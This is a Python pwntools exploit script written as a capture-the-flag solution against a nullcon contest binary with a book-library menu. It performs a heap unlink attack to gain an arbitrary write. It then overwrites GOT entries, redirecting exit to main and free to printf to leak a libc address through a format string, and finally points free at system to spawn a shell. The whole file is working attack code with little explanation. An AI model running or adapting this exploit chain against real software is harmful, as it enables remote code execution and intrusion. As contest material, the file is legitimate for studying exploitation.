from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'

TARGET = './challenge'
HOST = 'pwn2.ctf.nullcon.net'
PORT = 5002

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def alloc(name):
    r.sendlineafter('Checkout!\n', '1')
    r.sendafter('book?\n', name)

def delete(idx):
    r.sendlineafter('Checkout!\n', '2')
    r.sendlineafter('return?\n', str(idx))

def edit(idx, name):
    r.sendlineafter('Checkout!\n', '3')
    r.sendline(str(idx))
    r.sendafter('book?\n', name)

def go_out():
    r.sendlineafter('Checkout!\n', '4')

r = start()
if args.D:
    debug(r, [])

# r.sendafter('name?', "A"*0xd8 +p64(0x602190)+ p64(0)+p64(0x101))
r.sendafter('name?', "A"*0xf8)
target = 0x6021a8
alloc('a'*0xf7)#0
alloc('b'*0xf7)#1
alloc('c'*0xf7)#2
alloc('d'*0xf7)#3
alloc('/bin/sh\x00')#4
delete(1)
alloc(flat(0, 0xf1, target-0x18, target-0x10)+'C'*0xd0+p64(0xf0))#1
delete(2)

edit(1, 'A'*0x10+p64(elf.got.exit)[:-1]) # [:-1] for avoid destroying #1 ptr
edit(0, p64(0x400a3f))# exit -> main

go_out()

r.sendafter('name?', "hoge")
edit(1, 'A'*0x10+p64(elf.got.free)[:-1]) # [:-1] for avoid destroying #1 ptr
edit(0, p64(elf.plt.printf)[:-1])

alloc('%21$p')#2
delete(2)
leak = int(r.recvuntil('-')[:-1], 16)
base = leak - 0x20830
dbg("leak")
dbg("base")
system = base + 0x45390

edit(1, 'A'*0x10+p64(elf.got.free)[:-1]) # [:-1] for avoid destroying #1 ptr
edit(0, p64(system)[:-1])
delete(4)

r.interactive()
r.close()
